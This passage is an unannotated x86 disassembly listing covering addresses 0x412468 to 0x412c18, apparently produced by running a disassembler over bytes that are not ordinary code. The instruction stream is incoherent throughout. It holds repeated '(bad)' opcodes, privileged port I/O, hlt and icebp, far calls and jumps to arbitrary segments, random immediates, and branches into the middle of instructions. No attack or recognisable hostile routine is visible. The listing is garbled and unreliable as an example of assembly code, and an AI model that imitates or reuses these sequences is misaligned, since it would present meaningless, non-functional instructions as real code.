  412468:	(bad)  
  412469:	cdq    
  41246a:	imul   edx,DWORD PTR [ebp+0x1b],0xffffffce
  41246e:	cmp    cl,BYTE PTR [esi+0x5]
  412471:	hlt    
  412472:	in     al,dx
  412473:	fisub  WORD PTR [ebx-0x754a3432]
  412479:	ja     0x4124a7
  41247b:	or     DWORD PTR [edx],esp
  41247d:	push   ebp
  41247e:	test   eax,0x7ebf63f7
  412483:	jg     0x4124fb
  412485:	ret    0x38c2
  412488:	xchg   ecx,eax
  412489:	jo     0x412422
  41248b:	xchg   BYTE PTR [eax-0x284cdd7d],cl
  412491:	mov    bh,0xe5
  412493:	xor    al,0xfe
  412495:	cs xor al,0x3
  412498:	and    al,BYTE PTR [edx+0x20]
  41249b:	inc    esi
  41249c:	lock scas eax,DWORD PTR es:[edi]
  41249e:	sahf   
  41249f:	cmp    DWORD PTR [esp+eax*2],edi
  4124a2:	fucomi st,st(2)
  4124a4:	(bad)  
  4124a5:	adc    ah,BYTE PTR [eax-0x7f]
  4124a8:	mov    edx,0x341f9621
  4124ad:	ins    DWORD PTR es:[edi],dx
  4124ae:	dec    edx
  4124af:	mov    ds:0xc8bd581a,al
  4124b4:	test   eax,0xdb922b7d
  4124b9:	cld    
  4124ba:	cs call 0x7a8b:0x5382529e
  4124c2:	stos   DWORD PTR es:[edi],eax
  4124c3:	pushf  
  4124c4:	mov    eax,0xc5d51f8a
  4124c9:	inc    edx
  4124ca:	dec    ebp
  4124cb:	mov    WORD PTR [esi-0x58],gs
  4124ce:	mov    ebp,0x3f6eae3f
  4124d3:	sbb    ah,BYTE PTR [esi+0x74bfaaab]
  4124d9:	fidivr WORD PTR [ebx+edx*2-0x55fe997d]
  4124e0:	xchg   esi,eax
  4124e1:	rol    DWORD PTR [eax+0x46],1
  4124e4:	and    al,0x93
  4124e6:	jne    0x412492
  4124e8:	pop    esp
  4124e9:	mov    ebx,0x8b735762
  4124ee:	pop    esp
  4124ef:	loop   0x41256a
  4124f1:	outs   dx,BYTE PTR ds:[esi]
  4124f2:	nop
  4124f3:	inc    ebx
  4124f4:	test   DWORD PTR [esp+esi*2+0x14],ecx
  4124f8:	push   ds
  4124f9:	mov    cl,0x70
  4124fb:	or     DWORD PTR [ebx+0x2e],ecx
  4124fe:	in     eax,0xd7
  412500:	stos   BYTE PTR es:[edi],al
  412501:	lea    esi,[ebp+0x6]
  412504:	stc    
  412505:	imul   esp,DWORD PTR [esp+edi*2+0x6d],0x21
  41250a:	adc    BYTE PTR [ecx+0x5],bh
  41250d:	in     eax,0x6b
  41250f:	inc    ebp
  412510:	push   esi
  412511:	out    dx,eax
  412512:	loop   0x41250e
  412514:	pop    esi
  412516:	ret    0xed0a
  412519:	fst    QWORD PTR [ebx+edx*1+0x16]
  41251d:	dec    ebx
  41251e:	jle    0x412581
  412520:	or     bl,BYTE PTR [ebx+0x5c]
  412523:	mov    edi,0x76c85e41
  412528:	sub    DWORD PTR [edx],ebx
  41252a:	xchg   ebx,eax
  41252b:	pop    esp
  41252c:	aad    0xda
  41252e:	test   al,0x4e
  412530:	gs adc al,0x7b
  412533:	les    esi,FWORD PTR [ecx+0x11316be6]
  412539:	pop    ds
  41253a:	xchg   DWORD PTR [edi-0x22420b9a],eax
  412540:	sbb    al,0xb1
  412542:	mov    bh,0xec
  412544:	cld    
  412545:	push   esi
  412546:	mul    BYTE PTR [esp+esi*8+0x5365b26]
  41254d:	outs   dx,DWORD PTR ds:[esi]
  41254e:	call   0x1aa4:0xe13ee4ff
  412555:	sub    DWORD PTR [eax-0x5142dfff],ebx
  41255b:	or     ecx,eax
  41255d:	jns    0x412511
  41255f:	in     eax,dx
  412560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412561:	inc    BYTE PTR [esi+0x5e]
  412564:	pop    ds
  412565:	pop    esp
  412566:	xchg   esp,eax
  412567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412568:	out    dx,eax
  412569:	shr    ch,1
  41256b:	and    eax,0xd0d53902
  412570:	mov    dl,al
  412572:	retf   
  412573:	xor    eax,0x2fadf3de
  412578:	inc    esi
  412579:	icebp  
  41257a:	pop    edx
  41257b:	leave  
  41257c:	lock xor BYTE PTR [ebx],ah
  41257f:	arpl   WORD PTR [ecx],bp
  412581:	xchg   edi,eax
  412582:	mov    al,ds:0x20a285a6
  412587:	push   ebp
  412588:	inc    esp
  412589:	and    ebp,DWORD PTR [ebx+0xe]
  41258c:	push   esi
  41258d:	mov    al,0x6
  41258f:	adc    bl,BYTE PTR [ebx*2+0x5f3f4330]
  412596:	jmp    DWORD PTR [edx]
  412598:	cmp    BYTE PTR [ebx+0x1d],al
  41259b:	mov    ds:0xf14aa5f2,al
  4125a0:	retf   0x4e6e
  4125a3:	imul   esi,DWORD PTR [ecx+0x40],0x49353c41
  4125aa:	inc    esi
  4125ab:	es dec esi
  4125ad:	pop    eax
  4125ae:	or     DWORD PTR [edi],ecx
  4125b0:	ror    BYTE PTR [esi],cl
  4125b2:	mov    dh,dl
  4125b4:	sbb    eax,0x849c5627
  4125b9:	and    ecx,esp
  4125bb:	and    eax,0xaa9515ed
  4125c0:	mov    al,0xfa
  4125c2:	loope  0x41263a
  4125c4:	in     al,0x60
  4125c6:	in     al,dx
  4125c7:	push   ebp
  4125c8:	push   ebp
  4125c9:	(bad)  
  4125ca:	jae    0x4125f7
  4125cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125cd:	int    0x9d
  4125cf:	sti    
  4125d0:	ja     0x41255a
  4125d2:	and    eax,ecx
  4125d4:	cmp    eax,0x8880cb1d
  4125d9:	lods   al,BYTE PTR ds:[esi]
  4125da:	outs   dx,BYTE PTR ds:[esi]
  4125db:	or     DWORD PTR [ebp-0x6e],ebp
  4125de:	lea    edi,[ebp-0x534ad734]
  4125e4:	in     al,dx
  4125e5:	ret    
  4125e6:	leave  
  4125e7:	cmc    
  4125e8:	sbb    edi,esp
  4125ea:	(bad)  
  4125eb:	in     al,dx
  4125ec:	fwait
  4125ed:	mov    ds:0xd205d96c,al
  4125f2:	in     eax,dx
  4125f3:	shl    BYTE PTR [esi],cl
  4125f5:	sbb    ebx,esi
  4125f7:	mov    eax,0x954d77b3
  4125fc:	in     eax,0xa5
  4125fe:	fist   WORD PTR [edi+0x2ca82868]
  412604:	loop   0x412678
  412606:	sub    ebx,DWORD PTR [edi+0x678d3413]
  41260c:	dec    edx
  41260d:	xchg   ebp,eax
  41260e:	push   0xb947a675
  412613:	inc    esi
  412614:	add    bl,BYTE PTR [esp+edi*8]
  412617:	data16 aad 0x39
  41261a:	cmp    DWORD PTR [bx-0x24],0x6f
  41261f:	popa   
  412620:	jg     0x412653
  412622:	jmp    0x59fc3ac8
  412627:	ret    
  412628:	imul   edi,DWORD PTR [ebp-0x16],0x50
  41262c:	fst    QWORD PTR ds:0x1866563c
  412632:	jp     0x4125d3
  412634:	cmp    eax,0x66b91c0f
  412639:	add    DWORD PTR [ebp+0x4a790f27],0xffffff99
  412640:	dec    eax
  412641:	ja     0x412631
  412643:	pop    esi
  412644:	iret   
  412645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412646:	cdq    
  412647:	aam    0x63
  412649:	repz jg 0x412655
  41264c:	cmp    DWORD PTR fs:[ebx-0x12],0x71
  412651:	sbb    bl,BYTE PTR [edi+0x49061de1]
  412657:	cli    
  412658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412659:	dec    ebp
  41265a:	mov    esi,0x5944bac2
  41265f:	inc    eax
  412660:	mov    eax,0xacc8eb49
  412665:	sub    al,0xb1
  412667:	fld    TBYTE PTR [ebx]
  412669:	sub    edx,edi
  41266b:	aam    0xea
  41266d:	jecxz  0x4125f0
  41266f:	inc    esp
  412670:	jae    0x41268d
  412672:	sub    ah,BYTE PTR [ecx+0x19]
  412675:	imul   esi,DWORD PTR [edx-0x11514dae],0xe22c2e5b
  41267f:	push   ds
  412680:	push   eax
  412681:	scas   al,BYTE PTR es:[edi]
  412682:	retf   0xb176
  412685:	repnz aas 
  412687:	paddb  mm4,QWORD PTR [eax]
  41268a:	ja     0x41262a
  41268c:	push   0x57
  41268e:	into   
  41268f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412690:	jae    0x412708
  412692:	sub    ah,BYTE PTR [esi-0x6cdc0d87]
  412698:	push   es
  412699:	ja     0x41270c
  41269b:	enter  0x6250,0xdf
  41269f:	mov    bl,0x58
  4126a1:	push   edi
  4126a2:	bound  edx,QWORD PTR [ecx+0x5c]
  4126a5:	daa    
  4126a6:	icebp  
  4126a7:	test   al,0x2b
  4126a9:	into   
  4126aa:	adc    ebp,DWORD PTR [edx+0xf]
  4126ad:	mov    ebp,0xa89aa9df
  4126b2:	add    dh,BYTE PTR [ecx]
  4126b4:	cli    
  4126b5:	dec    ecx
  4126b6:	je     0x41267e
  4126b8:	xchg   esp,eax
  4126b9:	adc    DWORD PTR [esp+ebx*2+0x7e],ebp
  4126bd:	jl     0x412647
  4126bf:	inc    ebp
  4126c0:	cmp    al,0x36
  4126c2:	push   es
  4126c3:	in     eax,dx
  4126c4:	inc    edi
  4126c5:	cmp    DWORD PTR [edx-0x644920c6],0x5dd7e282
  4126cf:	int    0x77
  4126d1:	xchg   ebx,esp
  4126d3:	xor    ch,BYTE PTR [edi+0x2b]
  4126d6:	pop    esi
  4126d7:	mov    ebx,0xbf138398
  4126dc:	sbb    eax,0xbfe99757
  4126e1:	mov    ds:0xf114664,eax
  4126e6:	jmp    0x6bde:0x7a6746a9
  4126ed:	aad    0x65
  4126ef:	(bad)  
  4126f0:	out    dx,al
  4126f1:	and    al,0x34
  4126f3:	push   ebp
  4126f4:	bound  edi,QWORD PTR [ecx]
  4126f6:	sub    cl,BYTE PTR [ebp-0x604f65fb]
  4126fc:	fcomp  DWORD PTR [edx+0xb47e82b]
  412702:	aas    
  412703:	fidivr WORD PTR [ebx]
  412705:	pusha  
  412706:	popf   
  412707:	dec    DWORD PTR [ebp*4+0x3be782d5]
  41270e:	sbb    DWORD PTR [esi+eax*2+0x43],edi
  412712:	fs pop ebx
  412714:	fld    QWORD PTR ds:0x90653ac9
  41271a:	in     al,dx
  41271b:	mov    bl,0xbd
  41271d:	mov    esi,0xc9022a4d
  412722:	mov    cl,0x2b
  412724:	aam    0x7c
  412726:	fstp   QWORD PTR [edx]
  412728:	add    BYTE PTR [eax-0x7d],dl
  41272b:	loop   0x412747
  41272d:	bnd ret 
  41272f:	dec    edx
  412730:	cmp    BYTE PTR [ecx],dl
  412732:	call   0x3f11741e
  412737:	ja     0x4126d2
  412739:	pop    eax
  41273a:	sub    DWORD PTR [ebx+eax*1+0x46bdca7b],0xb4a82a0
  412745:	loopne 0x41279d
  412747:	jns    0x4126e2
  412749:	loop   0x4126e7
  41274b:	sub    edi,DWORD PTR [edi-0x5560c6e1]
  412751:	repz jmp 0xc2337f25
  412757:	test   BYTE PTR [ebx-0x3eb27129],0x76
  41275e:	and    ebx,DWORD PTR [esi]
  412760:	sbb    al,0x9b
  412762:	lods   al,BYTE PTR ds:[esi]
  412763:	add    eax,0x4d0555f0
  412768:	js     0x4126f5
  41276a:	xchg   ebx,eax
  41276b:	push   ebp
  41276c:	sahf   
  41276d:	shl    ebx,1
  41276f:	cdq    
  412770:	dec    esi
  412771:	inc    ebx
  412772:	add    ah,BYTE PTR [ecx]
  412774:	call   0xfc1d:0x6521ad10
  41277b:	xor    DWORD PTR [ebp+edi*4-0x6],edi
  41277f:	mov    BYTE PTR [ecx-0x40],0x44
  412783:	out    0x34,eax
  412785:	add    dh,al
  412787:	inc    esi
  412788:	sbb    bh,BYTE PTR [edi+0x9]
  41278b:	ret    0x9aa3
  41278e:	jmp    0x82ee8a74
  412793:	inc    esi
  412794:	or     edx,DWORD PTR [ebp+0x9]
  412797:	adc    eax,0x8223368
  41279c:	mov    edx,0xa4a94640
  4127a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a2:	dec    eax
  4127a3:	and    al,0x8a
  4127a5:	cs adc cl,bl
  4127a8:	pop    DWORD PTR [edx+ebp*2-0x65]
  4127ac:	dec    ebp
  4127ad:	in     eax,0x78
  4127af:	mov    cl,0x20
  4127b1:	xchg   DWORD PTR [ecx],ecx
  4127b3:	test   al,0xfb
  4127b5:	mov    WORD PTR es:[edx],ds
  4127b8:	or     edx,ebp
  4127ba:	mov    eax,ds:0x45d18697
  4127bf:	loopne 0x412836
  4127c1:	in     al,dx
  4127c2:	cli    
  4127c3:	jns    0x41274d
  4127c5:	int    0x3c
  4127c7:	leave  
  4127c8:	push   edi
  4127c9:	rcr    BYTE PTR [esi+edx*2+0x4e],0x7e
  4127ce:	neg    DWORD PTR [edi]
  4127d0:	cmp    DWORD PTR [eax],ebp
  4127d2:	adc    esi,edi
  4127d4:	fidivr DWORD PTR [edx]
  4127d6:	xchg   esp,eax
  4127d7:	aad    0xe2
  4127d9:	or     al,0x61
  4127db:	xchg   edx,eax
  4127dc:	pusha  
  4127dd:	shl    BYTE PTR [esi+0x29b3991e],1
  4127e3:	mov    edx,0xc271e44e
  4127e8:	loop   0x4127d6
  4127ea:	sbb    edx,esi
  4127ec:	jno    0x4127a2
  4127ee:	adc    bl,BYTE PTR [edi-0x10]
  4127f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127f2:	in     al,0x53
  4127f4:	(bad)  
  4127f5:	adc    al,0xde
  4127f7:	pop    ebp
  4127f8:	dec    BYTE PTR [ebp-0x4]
  4127fb:	loope  0x4127e3
  4127fd:	fcom   QWORD PTR [ebp-0x29]
  412800:	stos   DWORD PTR es:[edi],eax
  412801:	lea    esp,[eax]
  412803:	pop    ds
  412804:	add    al,0x2d
  412806:	xchg   ebp,eax
  412807:	and    eax,0x1b41ed37
  41280c:	sub    BYTE PTR [edx],ch
  41280e:	push   es
  41280f:	jmp    0x412876
  412811:	inc    esi
  412812:	in     al,dx
  412813:	dec    ebx
  412814:	das    
  412815:	sbb    ecx,DWORD PTR [eax+0x45ac517a]
  41281b:	mov    esi,0x4845fa73
  412820:	inc    eax
  412821:	mov    eax,DWORD PTR [edi]
  412823:	addr16 jo 0x412842
  412826:	sbb    BYTE PTR [esi],ch
  412828:	int3   
  412829:	mov    eax,ds:0xc50b8e05
  41282e:	mov    esp,DWORD PTR [eax-0x24]
  412831:	ficomp DWORD PTR [ebp+0x4213a3ac]
  412837:	or     BYTE PTR [edx+0x5248241a],bh
  41283d:	mov    BYTE PTR ds:[ecx],dl
  412840:	mov    esp,0xfade925b
  412845:	sub    BYTE PTR [edx],ah
  412847:	fwait
  412848:	sbb    DWORD PTR [esi-0x2defd61b],esi
  41284e:	xor    al,0x34
  412850:	lock das 
  412852:	icebp  
  412853:	cdq    
  412854:	cwde   
  412855:	jnp    0x4127f8
  412857:	mov    ebx,0xfe7a20af
  41285c:	gs ss (bad) 
  41285f:	cmp    BYTE PTR [edx+0x4716b4e],dh
  412865:	mov    ss,WORD PTR [ecx]
  412867:	outs   dx,DWORD PTR ds:[esi]
  412868:	add    esi,DWORD PTR [edx]
  41286a:	into   
  41286b:	fisubr WORD PTR [eax-0x16]
  41286e:	pop    ecx
  41286f:	dec    edx
  412870:	mov    eax,ds:0xa0215eeb
  412875:	div    DWORD PTR [esi-0x26]
  412878:	mov    BYTE PTR [eax],0xc4
  41287b:	(bad)  
  41287c:	in     eax,dx
  41287d:	and    al,0x3f
  41287f:	cli    
  412880:	test   DWORD PTR [eax-0x6aee9c66],edi
  412886:	jle    0x4128ec
  412888:	arpl   WORD PTR [edi-0x18b74cb4],bp
  41288e:	clc    
  41288f:	fimul  DWORD PTR [ebx-0x4758285a]
  412895:	pop    edi
  412896:	mov    DWORD PTR [eax-0x28],ecx
  412899:	cmp    ebp,0x67
  41289c:	or     al,0x54
  41289e:	inc    edi
  41289f:	jl     0x41284a
  4128a1:	add    dh,BYTE PTR [edx-0x25a9f6a9]
  4128a7:	or     DWORD PTR [ebp-0x742aeafd],0xa96a3e52
  4128b1:	fs mov ebp,0xcd381510
  4128b7:	and    eax,0x94a49a02
  4128bc:	int    0xeb
  4128be:	ja     0x412911
  4128c0:	sub    al,0xa
  4128c2:	push   ebx
  4128c3:	lock ins DWORD PTR es:[edi],dx
  4128c5:	in     eax,dx
  4128c6:	call   0x25ecd200
  4128cb:	es xor al,0xab
  4128ce:	push   ds
  4128cf:	jmp    0x4128a7
  4128d1:	enter  0x57aa,0xfb
  4128d5:	(bad)  
  4128d6:	mov    edx,0x7a5561a6
  4128db:	mov    al,ds:0x4badf992
  4128e0:	fs mov al,0xa8
  4128e3:	inc    ecx
  4128e4:	push   edx
  4128e5:	loop   0x412886
  4128e7:	clc    
  4128e8:	xor    edx,esi
  4128ea:	in     al,0xac
  4128ec:	mov    dl,0x52
  4128ee:	(bad)  
  4128ef:	mov    ch,0x88
  4128f1:	mov    ah,0x8c
  4128f3:	sahf   
  4128f4:	add    DWORD PTR [ecx+ebp*8],edi
  4128f7:	sbb    DWORD PTR [eax-0x62],0xffffff98
  4128fb:	mov    al,ds:0x1e8e5a37
  412900:	add    eax,0xd74b3272
  412905:	outs   dx,DWORD PTR ds:[esi]
  412906:	hlt    
  412907:	mov    WORD PTR [edx],ss
  412909:	retf   0x8f2f
  41290c:	or     BYTE PTR [eax-0x63],bl
  41290f:	mov    cl,0x1a
  412911:	push   edx
  412912:	mov    bl,0xd5
  412914:	sub    dl,ah
  412916:	sub    DWORD PTR [eax+0x72],edx
  412919:	inc    edi
  41291a:	popa   
  41291b:	inc    edi
  41291c:	pop    ebp
  41291d:	add    DWORD PTR [ebp+0x7c],eax
  412920:	sub    BYTE PTR [ebx+0x6c3a199b],0xe6
  412927:	xchg   ecx,eax
  412928:	aas    
  412929:	pop    ebx
  41292a:	xchg   BYTE PTR [ebx-0x4f],ah
  41292d:	and    esi,DWORD PTR [edx-0x2b]
  412930:	mov    ebp,0x795ee504
  412935:	inc    edx
  412936:	and    BYTE PTR [edx-0x6e],0x98
  41293a:	pop    esp
  41293b:	pop    eax
  41293c:	iret   
  41293d:	popa   
  41293e:	adc    dl,dh
  412940:	lea    edx,[eax]
  412942:	and    esp,DWORD PTR [eax]
  412944:	sbb    cl,al
  412946:	sbb    BYTE PTR [edx+0x6fe8da6d],dl
  41294c:	pusha  
  41294d:	mov    al,ds:0xf816cd34
  412952:	cwde   
  412953:	loope  0x41292b
  412955:	cdq    
  412956:	dec    ecx
  412957:	cmp    eax,DWORD PTR [edi-0x36b3a6d]
  41295d:	int3   
  41295e:	aad    0xab
  412960:	(bad)  
  412961:	cmp    ah,BYTE PTR [eax+0x4d4e702d]
  412967:	test   al,0xdc
  412969:	pop    DWORD PTR [edx]
  41296b:	and    al,bl
  41296d:	add    ebp,DWORD PTR [ecx-0x21]
  412970:	aas    
  412971:	jmp    0x41295b
  412973:	xor    dl,al
  412975:	jns    0x412985
  412977:	in     al,0xd6
  412979:	add    ch,BYTE PTR [edi-0x1c6153ef]
  41297f:	pop    edi
  412980:	and    DWORD PTR [eax-0x62],edi
  412983:	push   eax
  412984:	inc    ebx
  412985:	int    0x53
  412987:	sub    ah,BYTE PTR [edi-0x72]
  41298a:	inc    esi
  41298b:	ret    0x51cd
  41298e:	fstp   QWORD PTR [esi]
  412990:	shr    BYTE PTR [eax+0x11cc8179],cl
  412996:	and    DWORD PTR [esi+0x7f6fd882],esp
  41299c:	ret    
  41299d:	(bad)  
  41299f:	mov    edi,0xa1e57bb1
  4129a4:	or     BYTE PTR [ebp-0x3b5ded9],cl
  4129aa:	and    BYTE PTR [edx+0x65],0x39
  4129ae:	adc    al,BYTE PTR [eax-0x35]
  4129b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129b2:	cmp    DWORD PTR [ecx+0x68],ecx
  4129b5:	test   BYTE PTR [edi-0xb74659d],bl
  4129bb:	retf   0x6b4a
  4129be:	stos   DWORD PTR es:[edi],eax
  4129bf:	arpl   WORD PTR [ecx-0x1ad2e92b],cx
  4129c5:	sbb    al,BYTE PTR [edi]
  4129c7:	in     al,0x87
  4129c9:	inc    edi
  4129ca:	clc    
  4129cb:	fs push ss
  4129cd:	shr    BYTE PTR [edi-0x304e2dc1],cl
  4129d3:	sub    BYTE PTR [ebx],ah
  4129d5:	mov    bh,0xca
  4129d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129d8:	in     eax,dx
  4129d9:	or     cl,dl
  4129db:	repz sbb DWORD PTR [ebp-0x63],ecx
  4129df:	push   0xd0b425f
  4129e4:	dec    ebp
  4129e5:	inc    esp
  4129e6:	imul   eax,DWORD PTR [eax+0x5d],0xffffff92
  4129ea:	aas    
  4129eb:	push   ebx
  4129ec:	mov    al,ds:0x9a350dd6
  4129f1:	leave  
  4129f2:	aas    
  4129f3:	cmp    esi,DWORD PTR [eax-0x4b42de51]
  4129f9:	dec    eax
  4129fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129fb:	scas   eax,DWORD PTR es:[edi]
  4129fc:	or     eax,0x5521d603
  412a01:	jmp    0x412a17
  412a03:	or     DWORD PTR [edx-0x25261be1],edi
  412a09:	leave  
  412a0a:	mov    esi,0x8afe0eba
  412a0f:	adc    eax,0x7164000f
  412a14:	pop    esi
  412a15:	dec    BYTE PTR [edx-0x4c]
  412a18:	jp     0x4129b1
  412a1a:	mov    DWORD PTR [bx+0x5a],eax
  412a1e:	xchg   BYTE PTR [esi+0x9],dh
  412a21:	leave  
  412a22:	cmc    
  412a23:	xor    BYTE PTR [ecx-0x32],bh
  412a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a27:	stos   DWORD PTR es:[edi],eax
  412a28:	mov    esp,0xf3864c3b
  412a2d:	sti    
  412a2e:	xchg   ebp,eax
  412a2f:	add    ah,cl
  412a31:	dec    edx
  412a32:	mov    bh,0x80
  412a34:	dec    ecx
  412a35:	mov    eax,ds:0x2897c4a0
  412a3a:	pusha  
  412a3b:	(bad)
  412a3e:	jecxz  0x412a25
  412a40:	add    edx,DWORD PTR [edx]
  412a42:	lods   al,BYTE PTR ds:[esi]
  412a43:	mov    ah,0x89
  412a45:	pop    ss
  412a46:	dec    edx
  412a47:	lea    edx,[ebx+eax*1+0x11]
  412a4b:	shl    DWORD PTR [edi-0x3bf28fc],0xee
  412a52:	or     BYTE PTR [ecx+0x14bdc5bc],ah
  412a58:	adc    bl,bl
  412a5a:	mov    ds:0xca36bfda,eax
  412a5f:	mov    ecx,DWORD PTR [edx]
  412a61:	or     esi,esi
  412a63:	mov    ch,0xcd
  412a65:	fistp  WORD PTR [ecx+0x5]
  412a68:	pop    es
  412a69:	loopne 0x412a2c
  412a6b:	mov    al,0xba
  412a6d:	mov    esp,0x20e6688f
  412a72:	jp     0x412a26
  412a74:	fist   WORD PTR [ecx]
  412a76:	mov    bh,BYTE PTR [edx]
  412a78:	xor    al,0xbe
  412a7a:	or     eax,0x9652c9ce
  412a7f:	adc    BYTE PTR [esi-0x25],0x57
  412a83:	jb     0x412a73
  412a85:	xor    bl,BYTE PTR [ecx-0x33]
  412a88:	mov    DWORD PTR [ebx],edx
  412a8a:	pushf  
  412a8b:	out    0xc5,al
  412a8d:	scas   al,BYTE PTR es:[edi]
  412a8e:	sbb    esi,DWORD PTR [edi]
  412a90:	and    al,0x68
  412a92:	xchg   ebp,eax
  412a93:	push   esi
  412a94:	inc    edi
  412a95:	dec    eax
  412a96:	xchg   ebp,eax
  412a97:	cmp    dh,bl
  412a99:	xor    al,0x9
  412a9b:	cld    
  412a9c:	out    0x40,eax
  412a9e:	pusha  
  412a9f:	mov    ebx,0x8f3a3d59
  412aa4:	out    0xe7,eax
  412aa6:	int    0x80
  412aa8:	mov    al,0x35
  412aaa:	cwde   
  412aab:	adc    eax,edx
  412aad:	ss and eax,0xbe6b1207
  412ab3:	jnp    0x412b21
  412ab5:	(bad)  
  412ab6:	repnz mov ecx,0x6ea15968
  412abc:	(bad)  
  412abd:	xor    BYTE PTR [ebx+eiz*8+0x4c],ah
  412ac1:	xchg   ecx,eax
  412ac2:	mov    edx,0x7a0d6705
  412ac7:	mov    al,ds:0x31852224
  412acc:	inc    eax
  412acd:	dec    edx
  412ace:	push   ecx
  412acf:	repnz and esp,DWORD PTR [ebx]
  412ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad3:	jns    0x412ad1
  412ad5:	jecxz  0x412a6e
  412ad7:	sbb    edi,DWORD PTR [edi+0x6d]
  412ada:	shl    DWORD PTR [edx],1
  412adc:	in     eax,dx
  412add:	inc    ebp
  412ade:	push   es
  412adf:	popa   
  412ae0:	mov    gs,WORD PTR [ebx-0x34]
  412ae3:	nop
  412ae4:	jns    0x412abb
  412ae6:	jns    0x412ac3
  412ae8:	sub    DWORD PTR [ebp+0x7aeb3b04],eax
  412aee:	scas   al,BYTE PTR es:[edi]
  412aef:	test   dh,cl
  412af1:	(bad)  
  412af2:	push   ebp
  412af3:	mov    eax,ds:0x249fdc97
  412af8:	cmp    al,0xbb
  412afa:	in     eax,0x37
  412afc:	dec    edx
  412afd:	cmp    esp,0xffffffb7
  412b00:	adc    DWORD PTR gs:[edi+0x15],ecx
  412b04:	into   
  412b05:	adc    al,BYTE PTR [ecx*4+0x6fc6a3e5]
  412b0c:	fadd   st,st(7)
  412b0e:	xchg   ebp,eax
  412b0f:	retf   
  412b10:	gs daa 
  412b12:	leave  
  412b13:	ja     0x412abe
  412b15:	add    esp,ebp
  412b17:	ss inc esp
  412b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b1a:	je     0x412b75
  412b1c:	push   ebx
  412b1d:	xor    ebx,DWORD PTR [esi]
  412b1f:	mul    DWORD PTR [ebp-0x5357ae1a]
  412b25:	push   edx
  412b26:	mov    edi,0xf5f83eb7
  412b2b:	cmc    
  412b2c:	and    eax,0x6f229e80
  412b31:	mov    gs,WORD PTR [esi]
  412b33:	xor    cl,al
  412b35:	cdq    
  412b36:	enter  0x304d,0x70
  412b3a:	mov    edi,0x3f3932c9
  412b3f:	inc    esp
  412b40:	aad    0xe5
  412b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b43:	mov    edx,0xbcfdff88
  412b48:	inc    edx
  412b49:	stos   DWORD PTR es:[edi],eax
  412b4a:	in     al,dx
  412b4b:	inc    ecx
  412b4c:	dec    esi
  412b4d:	mov    DWORD PTR [ecx-0x43b8294b],ecx
  412b53:	jb     0x412ba3
  412b55:	inc    edx
  412b56:	call   DWORD PTR [ebx]
  412b58:	test   BYTE PTR [ebp-0x73c8597c],ah
  412b5e:	into   
  412b5f:	mov    edx,0x5e7842c9
  412b64:	sbb    ch,BYTE PTR [esp+ebx*8-0x9]
  412b68:	call   0x8826:0x3d37bb65
  412b6f:	sbb    DWORD PTR [ebp+0x10ea9624],ebx
  412b75:	adc    DWORD PTR [ecx+ebp*4-0x5c],esp
  412b79:	fistp  WORD PTR [ecx]
  412b7b:	adc    eax,eax
  412b7d:	fucomi st,st(2)
  412b7f:	xchg   esi,eax
  412b80:	pop    esp
  412b81:	leave  
  412b82:	pusha  
  412b83:	sbb    cl,BYTE PTR [edx-0x4703379e]
  412b89:	jno    0x412bb2
  412b8b:	sahf   
  412b8c:	mov    ch,0xca
  412b8e:	jl     0x412bd5
  412b90:	adc    DWORD PTR [ebx+esi*2],eax
  412b93:	call   0xd1c9:0x8c7ece74
  412b9a:	inc    edi
  412b9b:	dec    edx
  412b9c:	dec    esp
  412b9d:	dec    esi
  412b9e:	fst    DWORD PTR [ebx]
  412ba0:	ret    
  412ba1:	loop   0x412b63
  412ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba4:	dec    ecx
  412ba5:	mov    edi,0xcbc5d1ad
  412baa:	mov    edi,0xae3b4e9a
  412baf:	das    
  412bb0:	add    BYTE PTR [edi],dh
  412bb2:	jle    0x412c15
  412bb4:	pop    ecx
  412bb5:	jae    0x412bc5
  412bb7:	add    al,0xba
  412bb9:	mov    WORD PTR [ebp-0x1752f9db],cs
  412bbf:	sub    BYTE PTR [ebp+0x70],0x8d
  412bc3:	leave  
  412bc4:	mov    ah,0x19
  412bc6:	dec    eax
  412bc7:	int    0x13
  412bc9:	jnp    0x412b5e
  412bcb:	bound  edi,QWORD PTR [edi-0x7]
  412bce:	aam    0x74
  412bd0:	jl     0x412bca
  412bd2:	frstor [edi]
  412bd4:	call   0x6447f684
  412bd9:	mov    esi,0x6847b166
  412bde:	aaa    
  412bdf:	out    0xdf,al
  412be1:	mov    ecx,ds
  412be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be4:	fucom  st(7)
  412be6:	test   al,0x9f
  412be8:	jae    0x412c07
  412bea:	adc    eax,0x574aa733
  412bef:	aad    0x56
  412bf1:	dec    ebx
  412bf2:	ins    BYTE PTR es:[edi],dx
  412bf3:	aad    0xa5
  412bf5:	xor    BYTE PTR [esi],ah
  412bf7:	rcr    DWORD PTR [ebx-0x7f],1
  412bfa:	inc    eax
  412bfb:	push   ecx
  412bfc:	xchg   DWORD PTR [ecx+0xe883317],edx
  412c02:	xchg   ebp,eax
  412c03:	or     al,0x69
  412c05:	(bad)  
  412c06:	jge    0x412c58
  412c08:	ins    DWORD PTR es:[edi],dx
  412c09:	mov    bl,0x9e
  412c0b:	dec    ebp
  412c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c0d:	mov    ebp,es
  412c0f:	cwde   
  412c10:	dec    esi
  412c11:	add    dl,al
  412c13:	(bad)
  412c16:	out    dx,al
  412c17:	xchg   edx,eax
  412c18:	sub    ch,BYTE PTR [edi]
